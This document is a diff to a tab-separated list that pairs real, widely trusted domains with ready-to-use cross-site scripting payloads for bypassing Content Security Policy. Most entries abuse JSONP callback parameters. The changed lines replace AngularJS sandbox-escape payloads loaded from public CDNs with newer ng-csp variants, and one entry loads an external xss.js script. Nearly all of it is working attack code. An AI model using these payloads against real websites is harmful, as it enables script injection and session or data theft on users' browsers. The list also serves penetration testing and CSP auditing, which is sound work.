@@ -1,7 +1,7 @@
 Domain	Code
 accounts.google.com	<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
 ads.yap.yahoo.com	<script src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb=alert();"></script>
-ajax.googleapis.com	<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.4.5/angular.js"></script><div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}}</div>
+ajax.googleapis.com	<body ng-app ng-csp><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.5/angular.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 api.bing.com	<script src="https://api.bing.com/osjson.aspx?query=x&JsonType=callback&JsonCallback=alert"></script>
 api.dailymotion.com	<script src="https://api.dailymotion.com/video/x5gv6be?callback=alert()"></script>
 api.duckduckgo.com	<script src="https://api.duckduckgo.com/?q=x&callback=alert&format=json"></script>
@@ -16,14 +16,14 @@ apis.google.com	<script src="https://apis.google.com/complete/search?client=chro
 apis.google.com	<iframe id=x src="/%GG"></iframe><script src="https://apis.google.com/complete/search?client=chrome&q=<script>alert(document.domain)</script>&callback=x.contentDocument.write"></script>
 app-sjint.marketo.com	<script src="https://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>
 app.link	<script src="https://app.link/_r?sdk=web&callback=alert"></script>
-apps.bdimg.com	<script src="//apps.bdimg.com/libs/angular.js/1.4.6/angular.min.js"></script><div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}}</div>
+apps.bdimg.com	<body ng-app ng-csp><script src="https://apps.bdimg.com/libs/angular.js/1.4.6/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 bebezoo.1688.com	<script src="https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)"></script>
 c.y.qq.com	<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=alert"></script>
-cdn.jsdelivr.net	<script src="https://cdn.jsdelivr.net/npm/angular@1.4.5/angular.min.js"></script><div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}}</div>
+cdn.jsdelivr.net	<body ng-app ng-csp><script src="https://cdn.jsdelivr.net/npm/angular@1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 cdn.jsdelivr.net	<script src="https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"></script>
-cdn.syncfusion.com	<script src="https://cdn.syncfusion.com/js/assets/external/angular.min.js"></script><div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}}</div>
-cdnjs.cloudflare.com	<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script><div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>
-code.angularjs.org	<script src="https://code.angularjs.org/1.4.5/angular.min.js"></script><div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}}</div>
+cdn.syncfusion.com	<body ng-app ng-csp><script src="https://cdn.syncfusion.com/js/assets/external/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+cdnjs.cloudflare.com	<body ng-app ng-csp><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.5/angular.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+code.angularjs.org	<body ng-app ng-csp><script src="https://code.angularjs.org/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 connect.mail.ru	<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=alert"></script>
 d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>
 elysiumwebsite.s3.amazonaws.com	<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
@@ -59,7 +59,7 @@ translate.googleapis.com	<script src="https://translate.googleapis.com/$discover
 translate.yandex.net	<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert"></script>
 uk.indeed.com	<script src="https://uk.indeed.com/m/newjobs?callback=alert"></script>
 ulogin.ru	<script src="https://ulogin.ru/token.php?callback=alert(1337)"></script>
-unpkg.com	<script src="https://unpkg.com/angular@1.4.5/angular.min.js"></script><div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}}</div>
+unpkg.com	<body ng-app ng-csp><script src="https://unpkg.com/angular@1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 vimeo.com	<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=alert"></script>
 wb.amap.com	<script src="https://wb.amap.com/channel.php?callback=alert"></script>
 widgets.pinterest.com	<script src="https://widgets.pinterest.com/v3/pidgets/boards/ciciwin/hedgehog-squirrel-crafts/pins/?callback=alert"></script>
